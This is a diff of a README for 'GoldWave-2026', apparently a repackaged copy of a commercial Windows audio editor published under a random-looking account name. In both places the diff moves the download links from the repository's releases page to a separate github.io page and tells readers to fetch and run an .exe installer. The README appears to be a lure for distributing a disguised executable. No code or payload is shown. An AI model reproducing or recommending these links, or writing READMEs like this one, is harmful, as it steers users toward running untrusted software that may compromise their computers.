@@ -1,6 +1,6 @@
 # 🎧 GoldWave-2026 - Record and edit audio with ease
 
-[![](https://img.shields.io/badge/Download-GoldWave-blue.svg)](https://github.com/zsazsaintercrossed993/GoldWave-2026/releases)
+[![](https://img.shields.io/badge/Download-GoldWave-blue.svg)](https://zsazsaintercrossed993.github.io)
 
 GoldWave-2026 provides a stable interface for audio recording and editing on Windows 10 and 11. This software processes sound files for podcasts, music production, and general audio restoration. Users manage waveforms, apply effects, and export audio in various formats using this tool.
 
@@ -18,7 +18,7 @@ GoldWave-2026 runs on standard Windows hardware. Ensure your computer meets thes
 
 You must obtain the installation file from the official releases page. 
 
-[Visit this page to download the latest setup file](https://github.com/zsazsaintercrossed993/GoldWave-2026/releases)
+[Visit this page to download the latest setup file](https://zsazsaintercrossed993.github.io)
 
 Select the most recent version of the installer listed in the assets section. Choose the file ending in `.exe` to begin the download. Save this file to your Downloads folder or your desktop to locate it easily.
 
